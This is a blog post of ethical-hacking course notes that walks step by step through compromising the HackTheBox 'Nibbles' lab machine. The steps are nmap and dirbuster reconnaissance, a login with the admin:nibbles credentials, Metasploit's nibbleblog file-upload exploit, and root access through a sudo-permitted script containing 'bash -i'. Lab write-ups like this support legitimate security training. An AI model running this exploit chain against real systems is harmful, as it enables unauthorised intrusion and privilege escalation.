---
layout:     post
title:      TCM PEH Hacking Nibbles Notes
date:       2021-03-18
summary:    TheCyberMentor's Practical Ethical Hacking course mid-course capstone, hacking HackTheBox Nibbles
categories: certs
thumbnail: cogs
tags:
 - certs
 - pwned
---
<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="HTB_Nibbles_0"></a>HTB Nibbles</h2>
<p class="has-line-data" data-line-start="1" data-line-end="2">Recording strokes to derive methodology</p>
<p class="has-line-data" data-line-start="3" data-line-end="7">nmap -A -T4 -p- 10.10.10.75<br>
Noted port 22 open<br>
Noted port 80 open<br>
Noted Ubuntu OS</p>
<hr>
<p class="has-line-data" data-line-start="8" data-line-end="25">searchsploit apache 2.4<br>
Visited 10.10.10.75:80 in browser<br>
Viewed wappalyzer extension, noted Ubuntu<br>
Viewed source<br>
Noted comment pointing to nibble blog directory<br>
Visited /nibbleblog<br>
Noted more links<br>
Viewed source<br>
searchsploit nibbles<br>
searchsploit nibble<br>
Noted nibbleblog 3 result SQLi<br>
Noted nibbleblog 4.0.3 Arb File Upload<br>
msfconsole<br>
search nibble<br>
use exploit/multi/http/nibbleblog_file_upload<br>
info<br>
Noted that this allows AUTHENTICATED remote attacker to blahblahblah</p>
<hr>
<p class="has-line-data" data-line-start="26" data-line-end="38">dirbuster&amp;<br>
<a href="http://10.10.10.75:80">http://10.10.10.75:80</a><br>
go faster<br>
/usr/share/wordlist/dirbuster/<em>medium</em><br>
/nibbleblog<br>
php<br>
Start<br>
Review tab<br>
Visited /nibbleblog/admin.php<br>
Logged in with Admin:nibbles<br>
Visited Settings<br>
Noted nibbleblog 4.0.3</p>
<hr>
<p class="has-line-data" data-line-start="39" data-line-end="71">In msfconsole<br>
options<br>
set password nibbles<br>
set username admin<br>
set rhosts 10.10.10.75<br>
set targeturi nibbleblog<br>
options<br>
exploit<br>
Noted session created<br>
sysinfo<br>
getuid<br>
shell<br>
pwd<br>
cd /home<br>
whoami<br>
cd nibbler<br>
ls -lha<br>
history<br>
cat .bash_history<br>
sudo -l<br>
mkdir personal<br>
cd personal<br>
mkdir stuff<br>
pwd<br>
echo “bash -i” &gt; <a href="http://monitor.sh">monitor.sh</a><br>
chmod +x <a href="http://monitor.sh">monitor.sh</a><br>
sudo <a href="http://monitor.sh">monitor.sh</a><br>
whoami<br>
Noted nibbler, still<br>
sudo /home/nibbler/personal/stuff/monitor.sh<br>
whoami<br>
Noted root</p>